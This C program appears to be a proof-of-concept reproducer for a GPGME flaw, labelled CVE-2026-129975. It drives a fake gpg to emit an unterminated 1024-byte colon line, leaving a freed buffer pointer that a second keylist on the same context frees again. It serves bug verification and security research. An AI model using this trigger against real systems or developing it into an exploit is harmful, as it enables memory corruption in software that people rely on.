/* Second affected reader of CVE-2026-129975: read_colon_line().
 *
 * Public APIs only. Operation 1 runs a keylist against a fake gpg that emits
 * exactly 1024 bytes with no LF on GPGME's colon pipe (the child's stdout).
 * read_colon_line() consumes all of them (readpos reaches the 1024-byte
 * buffer end); its next call reallocs to 2048 before reading and sees EOF,
 * returning at engine-gpg.c:1707 without the pointer writeback at :1728-1730.
 * gpg->colon.buffer is left pointing at the block realloc just freed.
 * Operation 2 is a keylist on the SAME context; engine reset frees the stale
 * block again. A status callback logs the chosen byte carried by the same
 * fake engine, but no callback errors are used on either path. If the build
 * does not reuse the context, that is a negative result, not an r5 claim.
 */
#include <gpgme.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

static gpgme_error_t
logging_status_cb (void *opaque, const char *keyword, const char *args)
{
  (void)opaque;
  fprintf (stderr,
           "status_cb keyword=%s arglen=%zu byte[1000]=0x%02x\n",
           keyword, strlen (args),
           strlen (args) > 1000 ? (unsigned char) args[1000] : 0);
  return 0;
}

static void
do_keylist (gpgme_ctx_t ctx, int op)
{
  gpgme_key_t key;
  gpgme_error_t err;

  fprintf (stderr, "op%d keylist_start\n", op);
  err = gpgme_op_keylist_start (ctx, "test", 0);
  fprintf (stderr, "op%d keylist_start err=%s\n", op, gpgme_strerror (err));
  while (!err)
    {
      err = gpgme_op_keylist_next (ctx, &key);
      if (!err)
        gpgme_key_release (key);
    }
  fprintf (stderr, "op%d keylist_end err=%s\n", op, gpgme_strerror (err));
}

int
main (int argc, char **argv)
{
  gpgme_ctx_t ctx = NULL;
  gpgme_error_t err;
  const char *version;

  if (argc != 2)
    {
      fprintf (stderr, "usage: %s FAKE_COLON_GPG_PATH\n", argv[0]);
      return 2;
    }
  version = gpgme_check_version (NULL);
  if (!version)
    return 2;
  fprintf (stderr, "gpgme version=%s\n", version);
  err = gpgme_set_engine_info (GPGME_PROTOCOL_OpenPGP, argv[1], NULL);
  if (err)
    return 2;
  err = gpgme_new (&ctx);
  if (err)
    return 2;
  gpgme_set_ctx_flag (ctx, "full-status", "1");
  gpgme_set_status_cb (ctx, logging_status_cb, NULL);

  setenv ("FAKE_COLON_LEN", getenv ("COLON_SAFE") ? "20" : "1024", 1);
  setenv ("FAKE_COLON_MARKER", "H", 1);
  do_keylist (ctx, 1);

  setenv ("FAKE_COLON_LEN", "20", 1);
  setenv ("FAKE_COLON_MARKER", "Z", 1);
  do_keylist (ctx, 2);

  gpgme_release (ctx);
  puts ("release done");
  return 0;
}
